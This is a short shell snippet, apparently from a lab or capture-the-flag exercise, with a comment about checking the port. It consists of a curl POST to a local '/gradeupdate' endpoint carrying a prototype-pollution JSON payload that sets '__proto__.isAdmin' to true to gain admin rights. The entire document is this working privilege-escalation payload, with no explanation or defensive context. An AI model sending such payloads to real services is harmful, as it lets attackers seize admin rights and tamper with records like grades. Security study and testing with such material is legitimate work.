# Have to make sure what the port is
curl -X POST http://localhost:50000/gradeupdate -H "Content-Type: application/json" -d '{"__proto__":{"isAdmin": true}}'